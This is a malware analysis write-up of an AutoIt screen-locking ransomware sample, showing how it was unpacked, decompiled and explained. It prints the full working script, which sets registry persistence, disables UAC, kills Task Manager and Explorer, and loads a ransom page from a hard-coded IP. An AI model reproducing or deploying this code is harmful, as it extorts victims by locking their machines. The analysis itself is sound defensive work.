# AutoIT ransomware #


## Introduction ##

We get from [twitter](https://twitter.com/unixfreaxjp/status/222185780662120448) a ransomware [here](http://forum.bitdefender.com/index.php?showtopic=35684), we do a fast analyse on it.

The md5 of the sample is f74e910c368717e9acef3a1b9a1a9f03.


## Tools ##
  * [IDA 5.0 free](http://www.hex-rays.com/products/ida/support/download_freeware.shtml)
  * [UPX](http://upx.sourceforge.net/)
  * [Exe2Aut](http://www.exe2aut.com)

## Analysis ##
We start by running our yara rules on it to check if it packed:

```
y0ug@laptop:~/malware$ yara-pack f74e910c368717e9acef3a1b9a1a9f03.exe 
UPXv20MarkusLaszloReiser f74e910c368717e9acef3a1b9a1a9f03.exe
UPXV200V290MarkusOberhumerLaszloMolnarJohnReiser f74e910c368717e9acef3a1b9a1a9f03.exe
```

UPX is detected so unpack it

```
y0ug@laptop:~/malware/f74e910c368717e9acef3a1b9a1a9f03$ upx -d f74e910c368717e9acef3a1b9a1a9f03.exe 
                       Ultimate Packer for eXecutables
                          Copyright (C) 1996 - 2011
UPX 3.08        Markus Oberhumer, Laszlo Molnar & John Reiser   Dec 12th 2011

        File size         Ratio      Format      Name
   --------------------   ------   -----------   -----------
    737817 <-    390169   52.88%    win32/pe     f74e910c368717e9acef3a1b9a1a9f03.exe

Unpacked 1 file.
```

Fast check on VT show that is not know.

We open it with IDA the main function call 40D590h (sub\_40D590), this function do a check IsDebuggerPrent, if a debugger is detected it popup a message box "This is a compiled AuoIt script AV researchers please email avsupport@autoitscript.com for support"

![http://malware-lu.googlecode.com/git/autoit_ransomware/img/ida_isdebug.png](http://malware-lu.googlecode.com/git/autoit_ransomware/img/ida_isdebug.png)

![http://malware-lu.googlecode.com/git/autoit_ransomware/img/ida_autoit_msgbox.png](http://malware-lu.googlecode.com/git/autoit_ransomware/img/ida_autoit_msgbox.png)

Note: The binary have the original icon of AutoIt so this give a clue too.

We already have tool to extract script in compiled AutoIt the name is [Exe2Aut](http://www.exe2aut.com).

To use this tool just drag&drop the binary in Exe2Aut interface and it show the script code

![http://malware-lu.googlecode.com/git/autoit_ransomware/img/exe2aut_autoit.png](http://malware-lu.googlecode.com/git/autoit_ransomware/img/exe2aut_autoit.png)

## Aut script fast analysis ##

The interesting part it at the end.

```
#NoTrayIcon
Opt("WinWaitDelay", 100)
Opt("WinDetectHiddenText", 1)
Opt("MouseCoordMode", 0)
Local $oie, $guiactivex, $gui_button_back, $gui_button_forward
Local $gui_button_home, $gui_button_stop, $msg, $url
ProcessClose("iexplore.exe")
ProcessClose("firefox.exe")
$url = "95.163.104.88/spielberg/start.php"
If @OSVersion = "WIN_7" OR @OSVersion = "WIN_VISTA" Then
	If @OSArch = "X64" Then
		RegWrite("HKEY_LOCAL_MACHINE64\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon", "Shell", "REG_SZ", @ScriptFullPath)
	Else
		RegWrite("HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon", "Shell", "REG_SZ", @ScriptFullPath)
	EndIf
EndIf
$ashell = RegRead("HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\SafeBoot", "AlternateShell")
If $ashell <> @ScriptFullPath Then
	If @OSVersion <> "WIN_7" OR @OSVersion = "WIN_VISTA" Then
		RegWrite("HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon", "Shell", "REG_SZ", @ScriptFullPath)
	EndIf
	RegWrite("HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\SafeBoot", "AlternateShell", "REG_SZ", @ScriptFullPath)
	RegWrite("HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Internet Explorer\Restrictions", "NoBrowserContextMenu", "REG_DWORD", "1")
	RegWrite("HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer", "NoViewContextMenu", "REG_DWORD", "1")
	RegWrite("HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System", "EnableLUA", "REG_DWORD", "0")
EndIf
$shell = RegRead("HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon", "Shell")
If $shell <> @ScriptFullPath Then
	FileCreateShortcut(@ScriptFullPath, @StartupDir & "\" & @ScriptName & ".lnk")
EndIf
$oie = ObjCreate("Shell.Explorer.2")
$hgui = GUICreate("", @DesktopWidth, @DesktopHeight, 0, 0, $ws_popup + $ws_ex_toolwindow, $ws_ex_layered + $ws_ex_topmost + $ws_ex_toolwindow)
$guiactivex = GUICtrlCreateObj($oie, 0, 0, @DesktopWidth, @DesktopHeight)
GUISetBkColor(1, $hgui)
GUISetState()
$oie.navigate($url)
_winapi_setlayeredwindowattributes($hgui, 1, 255, 3)
Local $timer, $diff
$timer = TimerInit()
While 1
	$diff = TimerDiff($timer)
	If $diff > 150 Then
		If ProcessExists("taskmgr.exe") Then
			ProcessClose("taskmgr.exe")
		EndIf
		If ProcessExists("explorer.exe") Then
			Run(@ComSpec & " /c " & "taskkill /f /im explorer.exe", "", @SW_HIDE)
		EndIf
		$diff = 0
		$timer = TimerInit()
	EndIf
	WinSetOnTop($hgui, "", 1)
	WinActivate($hgui)
WEnd
$hund = "rot"
$katze = "blau"

```

This script is pretty simple, it install a reg key to enable boot persistance in
HKEY\_LOCAL\_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\Shell

Change the value of  AlternateShell regkey to be run in SafeBoot
HKEY\_LOCAL\_MACHINE\SYSTEM\CurrentControlSet\Control\SafeBoot

Change internet explorer option to remove the context menu
HKEY\_LOCAL\_MACHINE\Software\Policies\Microsoft\Internet Explorer\Restrictions\NoBrowserContextMenu

Disable the LUA by switching to 0 the reg key
HKEY\_LOCAL\_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon

If the Winlogon not match the binary path, it creates a shortcut in the Startup dir.

It creates a object Shell.Explorer, and set a GUI with the size of the screen. It tells to the Shell.Explorer object to navigate on the $url (95.163.104.88/spielberg/start.php)

This url content the ransome page.

After it goes in a infinite loop where it checks all 150ms if taskmgr.exe or explorer.exe exist if one of them it runnings it try to kill it. It ensures too that the Shell.Explorer GUI is always on top of all others applications.

## Screenshot ##

![http://malware-lu.googlecode.com/git/autoit_ransomware/img/url_start.png](http://malware-lu.googlecode.com/git/autoit_ransomware/img/url_start.png)

![http://malware-lu.googlecode.com/git/autoit_ransomware/img/url_wrongpaysafecard.png](http://malware-lu.googlecode.com/git/autoit_ransomware/img/url_wrongpaysafecard.png)